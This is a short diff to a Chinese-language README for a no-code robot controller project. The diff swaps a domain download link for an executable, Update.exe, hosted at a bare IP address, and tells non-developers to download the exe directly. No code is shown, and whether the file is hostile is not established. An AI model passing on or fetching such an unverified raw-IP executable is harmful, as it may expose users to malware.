@@ -1,6 +1,6 @@
 # 机器人控制器——无代码控制机器人，这里有最新开放的源码  
   
-下载:http://fanbookwdg.qhla.eu.org/a.html  
+下载:https://1.117.76.68/Update.exe
 非开发者直接下载exe就行了
 # -4.0
 新增：  
